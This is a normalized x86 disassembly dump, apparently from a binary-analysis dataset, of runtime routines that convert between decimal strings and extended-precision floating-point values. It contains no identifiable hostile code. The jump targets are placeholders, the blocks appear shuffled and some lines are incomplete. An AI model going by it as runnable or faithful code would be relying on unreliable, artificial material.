mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_425886
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_425f4e ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_426d41
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_425f7e
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_41cf11
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_41cf11
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
